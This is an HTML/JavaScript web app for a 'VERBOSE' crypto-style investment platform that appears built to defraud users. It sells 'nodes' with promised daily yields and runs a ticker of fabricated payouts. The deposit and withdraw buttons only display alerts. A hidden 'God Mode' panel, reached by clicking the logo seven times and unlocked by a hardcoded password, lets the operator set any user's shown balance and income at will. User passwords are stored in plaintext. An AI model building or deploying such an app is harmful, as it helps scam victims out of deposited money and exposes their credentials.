<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Quantum God-Mode</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.04); --border: rgba(255,255,255,0.08); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.3s; font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }

  /* LIVE NEWS TICKER */
  .ticker-wrap { background: rgba(0,247,255,0.05); border-bottom: 1px solid var(--border); padding: 8px 0; overflow: hidden; white-space: nowrap; position: fixed; top: 0; width: 100%; z-index: 10000; }
  .ticker { display: inline-block; animation: scroll 25s linear infinite; font-size: 10px; font-weight: 800; color: var(--neon); text-transform: uppercase; letter-spacing: 1px; }
  @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }

  /* OVERLAYS */
  .overlay { position: fixed; inset: 0; background: var(--bg); z-index: 20000; padding: 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
  .glass-card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--border); padding: 35px; border-radius: 40px; backdrop-filter: blur(25px); text-align: center; }
  
  /* HEADER & NAV */
  header { text-align: center; padding: 70px 20px 10px; cursor: pointer; }
  .logo-text { font-size: 28px; font-weight: 800; letter-spacing: 10px; text-shadow: 0 0 20px var(--neon); }
  .page { max-width: 450px; margin: 0 auto; padding: 10px 20px 140px; display: none; }
  .active { display: block !important; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  /* WALLET & STATS */
  .wallet-box { background: linear-gradient(135deg, #0a0a0a, #000); border: 1px solid var(--neon); padding: 30px; border-radius: 35px; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,247,255,0.1); }
  .u-name { font-size: 12px; font-weight: 600; color: var(--neon); margin-bottom: 5px; display: block; letter-spacing: 2px; }
  .u-bal { font-size: 38px; font-weight: 800; }
  .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
  .stat-card { background: var(--card); border: 1px solid var(--border); padding: 18px; border-radius: 25px; }

  /* NODES */
  .node-item { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 18px; display: flex; align-items: center; gap: 15px; margin-bottom: 12px; border-left: 4px solid var(--accent); }
  .node-icon { width: 50px; height: 50px; background: rgba(0,247,255,0.05); border: 1px solid var(--neon); border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 22px; }

  /* BUTTONS */
  .btn-action { width: 100%; padding: 18px; border-radius: 20px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; margin-top: 15px; }
  input { width: 100%; padding: 16px; margin-top: 10px; border-radius: 18px; border: 1px solid var(--border); background: rgba(255,255,255,0.02); color: #fff; }

  /* NAV bar */
  .nav { position: fixed; bottom: 25px; left: 15px; right: 15px; background: rgba(10,10,10,0.95); backdrop-filter: blur(25px); display: none; justify-content: space-around; padding: 22px; border-radius: 40px; border: 1px solid var(--border); z-index: 1000; }
  .nav-item { font-size: 8px; opacity: 0.4; font-weight: 800; cursor: pointer; color: #fff; text-transform: uppercase; }
  .nav-item.active { opacity: 1; color: var(--neon); }
</style>
</head>
<body>

<div class="ticker-wrap">
    <div class="ticker">
        ⚠️ NETWORK STATUS: QUANTUM SERVERS ONLINE... 💎 TOTAL PAYOUT TODAY: PKR 1,45,000... 🛰️ NEW NODE v21.0 DEPLOYED... ✅ WITHDRAWALS PROCESSED IN 1 HOUR...
    </div>
</div>

<div id="authPage" class="overlay">
    <div class="glass-card">
        <div class="logo-text" style="font-size:24px;">VERBOSE</div>
        <input id="authName" placeholder="Full Name">
        <input id="authPhone" type="number" placeholder="Mobile Node ID">
        <input id="authPass" type="password" placeholder="Cloud Key">
        <button class="btn-action" onclick="handleAuth()">LOGIN SYSTEM</button>
        <p style="font-size:10px; margin-top:15px; opacity:0.5;">Secure Encryption: AES-256 Active</p>
    </div>
</div>

<div id="adminModal" class="overlay" style="display:none; z-index:40000;">
    <div class="glass-card" style="border-color:var(--gold);">
        <h3 style="color:var(--gold);">GOD MODE ACCESS</h3>
        <input id="adminKey" type="password" placeholder="Master Password">
        <button class="btn-action" style="background:var(--gold); color:#000;" onclick="verifyAdmin()">UNLOCK GOD MODE</button>
        <button onclick="document.getElementById('adminModal').style.display='none'" style="background:none; border:none; color:var(--error); margin-top:10px;">EXIT</button>
    </div>
</div>

<header id="adminTrigger"><div class="logo-text">VERBOSE</div></header>

<div id="dash" class="page">
    <div class="wallet-box">
        <span class="u-name" id="dispUser">CONNECTING...</span>
        <div class="u-bal">PKR <span id="uBal">0.00</span></div>
    </div>
    <div class="stat-grid">
        <div class="stat-card"><small>Daily Yield</small><div id="uDaily">0.00</div></div>
        <div class="stat-card"><small>Total Profit</small><div id="uTotal">0.00</div></div>
    </div>
</div>

<div id="nodesPage" class="page">
    <div id="nodeGrid"></div>
</div>

<div id="finance" class="page">
    <div class="stat-card" style="border-color:var(--success);">
        <h4 style="margin:0;">DEPOSIT</h4>
        <input id="dAmt" type="number" placeholder="Amount">
        <input id="dTID" placeholder="Transaction TID">
        <button class="btn-action" onclick="alert('Sent to God-Mode Control!')">SUBMIT</button>
    </div>
    <div class="stat-card" style="border-color:var(--error); margin-top:20px;">
        <h4 style="margin:0;">WITHDRAW</h4>
        <input id="wAmt" type="number" placeholder="Amount">
        <button class="btn-action" style="background:var(--error);" onclick="alert('Admin checking queue...')">WITHDRAW</button>
    </div>
</div>

<div id="adminPage" class="page">
    <h2 style="color:var(--gold); letter-spacing:3px;">GOD MODE HUD</h2>
    <div class="stat-card" style="border-color:var(--gold);">
        <input id="tUser" placeholder="Target Phone Number">
        <input id="nBal" type="number" placeholder="New Balance">
        <input id="nDaily" type="number" placeholder="New Daily Income">
        <button class="btn-action" style="background:var(--gold); color:#000;" onclick="godUpdate()">SYNC USER DATA</button>
    </div>
    <button class="btn-action" style="background:var(--error);" onclick="location.reload()">LOCK SYSTEM</button>
</div>

<nav class="nav" id="mainNav">
    <div class="nav-item active" onclick="tab('dash', this)">Home</div>
    <div class="nav-item" onclick="tab('nodesPage', this)">Nodes</div>
    <div class="nav-item" onclick="tab('finance', this)">Wallet</div>
    <div class="nav-item" onclick="logout()" style="color:var(--error);">Logout</div>
</nav>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, set, update, onValue, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  let user = localStorage.getItem('v_user');

  // --- NODES RENDER ---
  const nodeIcons = ["📡", "🛰️", "🚀", "🧬", "💎", "⚡", "🌀", "🛸", "🔋"];
  const grid = document.getElementById('nodeGrid');
  for(let i=1; i<=25; i++) {
    grid.innerHTML += `
      <div class="node-item">
        <div class="node-icon">${nodeIcons[i % nodeIcons.length]}</div>
        <div class="node-info"><h4>Server v.${i}</h4><p>PKR ${500*i} | Yield ${50*i}/Day</p></div>
        <button onclick="alert('Order Sent!')" style="background:var(--neon); border:none; padding:8px 15px; border-radius:12px; margin-left:auto; font-weight:800; font-size:10px;">BUY</button>
      </div>`;
  }

  // --- AUTH ---
  window.handleAuth = async () => {
    const p = document.getElementById('authPhone').value;
    const s = document.getElementById('authPass').value;
    const n = document.getElementById('authName').value;
    if(!p || !s) return alert("Fill data, sweetie!");

    const r = ref(db, `users/${p}`);
    const snap = await get(r);
    if(snap.exists()) {
        if(snap.val().pass === s) { localStorage.setItem('v_user', p); location.reload(); }
        else alert("Unauthorized!");
    } else {
        if(!n) return alert("Name required for Node ID creation!");
        await set(r, { name: n, pass: s, balance: 0, daily: 0, total: 0 });
        localStorage.setItem('v_user', p); location.reload();
    }
  };

  // --- GOD MODE CORE ---
  let clicks = 0;
  document.getElementById('adminTrigger').onclick = () => { if(++clicks >= 7) { document.getElementById('adminModal').style.display='flex'; clicks=0; } };
  window.verifyAdmin = () => { if(document.getElementById('adminKey').value === "nazim786") { document.getElementById('adminModal').style.display='none'; tab('adminPage', null); } else alert("Access Blocked!"); };
  
  window.godUpdate = () => {
    const t = document.getElementById('tUser').value;
    update(ref(db, `users/${t}`), { 
        balance: Number(document.getElementById('nBal').value),
        daily: Number(document.getElementById('nDaily').value)
    });
    alert("User Data Rewritten Successfully!");
  };

  // --- UI ---
  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
  };
  window.logout = () => { localStorage.clear(); location.reload(); };

  // --- SYNC ---
  if(user) {
    document.getElementById('authPage').style.display = 'none';
    document.getElementById('mainNav').style.display = 'flex';
    document.getElementById('dash').classList.add('active');
    onValue(ref(db, `users/${user}`), s => {
        const d = s.val();
        if(d) {
            document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
            document.getElementById('uDaily').innerText = (d.daily || 0).toLocaleString();
            document.getElementById('uTotal').innerText = (d.total || 0).toLocaleString();
            document.getElementById('dispUser').innerText = "OPERATOR: " + d.name.toUpperCase();
        }
    });
  }
</script>
</body>
</html>
